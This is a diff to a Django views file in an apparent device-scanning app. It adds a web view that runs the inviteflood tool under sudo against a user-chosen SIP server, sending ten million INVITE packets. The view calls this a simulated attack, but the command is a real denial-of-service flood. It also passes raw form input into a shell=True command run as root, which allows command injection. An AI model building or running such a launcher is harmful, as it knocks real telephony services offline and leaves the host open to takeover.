@@ -1,6 +1,8 @@
 from django.shortcuts import render
 import nmap
 import subprocess
+from django.http import JsonResponse
+from django.views import View
 
 def scan_devices(request):
     devices = []
@@ -42,27 +44,41 @@ def scan_devices(request):
     return render(request, 'device_finder/index.html', {'devices': devices, 'nmap_output': nmap_output})
 
 def next_page(request):
-    # This view renders the next page message
     return render(request, 'device_finder/next_page.html')
 
-
 def attacks_page(request):
-    # This view renders the next page message
     return render(request, 'device_finder/attacks.html')
 
-# Simulate different attacks with views
 def attack1(request):
-    # Here you can simulate Attack 1, for example logging or some other action
     return render(request, 'attacks/index.html', {'message': 'Attack 1 Triggered!'})
 
 def attack2(request):
-    # Simulate Attack 2
     return render(request, 'attacks/index.html', {'message': 'Attack 2 Triggered!'})
 
 def attack3(request):
-    # Simulate Attack 3
     return render(request, 'attacks/index.html', {'message': 'Attack 3 Triggered!'})
 
 def attack4(request):
-    # Simulate Attack 4
     return render(request, 'attacks/index.html', {'message': 'Attack 4 Triggered!'})
+
+def inviteflood_attack(request):
+    if request.method == "POST":
+        username = request.POST.get('username')
+        server_ip = request.POST.get('server_ip')
+        interface = 'eth0'
+        num_packets = '10000000'
+
+        try:
+            command = f"sudo inviteflood {interface} {username} {server_ip} {server_ip} {num_packets}"
+            result = subprocess.run(command, shell=True, capture_output=True, text=True)
+
+            if result.returncode == 0:
+                message = 'Inviteflood attack simulated successfully.'
+            else:
+                message = f'Error: {result.stderr}'
+        except Exception as e:
+            message = f'Error running inviteflood: {str(e)}'
+
+        return render(request, 'attacks/index.html', {'message': message})
+
+    return render(request, 'attacks/index.html', {'message': 'Invalid request method.'})
